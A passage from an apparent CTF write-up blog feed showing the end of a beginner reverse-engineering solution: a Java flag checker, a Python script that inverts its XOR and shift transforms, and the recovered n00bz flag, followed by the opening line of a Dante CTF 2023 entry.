&lt;&#x2F;span&gt;&lt;span&gt;                array2[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)(array2[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x37&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; array2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;j) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;final int&lt;&#x2F;span&gt;&lt;span&gt; n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; array2[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                array2[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)(array2[array2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                array2[array2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;                array2[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;)(array2[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Arrays&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;equals&lt;&#x2F;span&gt;&lt;span&gt;(array2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new int&lt;&#x2F;span&gt;&lt;span&gt;[] { &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;130&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;115&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;106&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;143&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;54&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;134&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;96&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;98&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;125&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;98&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;138&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;104&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;91&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;87&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;115 &lt;&#x2F;span&gt;&lt;span&gt;})) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;W&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;L&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. The command line input `String[] array` was passed to the main method.
&lt;&#x2F;span&gt;&lt;span&gt;2. The input String array converted to a dictionary of number&amp;#39;s 
&lt;&#x2F;span&gt;&lt;span&gt;3. The converted number dictionary is then compared with { 130, 37, 70, 115, 64, 106, 143, 34, 54, 134, 96, 98, 125, 98, 138, 104, 25, 3, 66, 78, 24, 69, 91, 80, 87, 67, 95, 8, 25, 22, 115 }
&lt;&#x2F;span&gt;&lt;span&gt;4. If the converted inputted string is equals to the above dictionary the check was successful.
&lt;&#x2F;span&gt;&lt;span&gt;5. So, We have to reverse the dictionary of numbers which are used in the comparision in order to get the initial string characters.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can see that the flag len is &lt;code&gt;31&lt;&#x2F;code&gt;. First we have to reverse the second for loop then the first for loop to get the flag characters.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solve.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;130&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;115&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;106&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;143&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;54&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;134&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;96&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;98&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;125&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;98&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;138&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;104&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;91&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;87&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;115&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(final)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;final[j]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20
&lt;&#x2F;span&gt;&lt;span&gt;        final[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;final[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(final)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;        final[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(final)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        final[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;final[j]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# print(final)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(final)):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        final[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;final[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        final[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;final[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x37
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(final)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;final:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# n00bz{r3v_1s_s0_e4zy_r1ght??!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : n00bz{r3v_1s_s0_e4zy_r1ght??!!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dante CTF 2023</title>
        <published>2023-06-06T00:00:00+00:00</published>
        <updated>2023-06-06T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/dantectf23/"/>
        <id>https://themj0ln1r.github.io/writeups/dantectf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/dantectf23/">&lt;p&gt;Hello all!
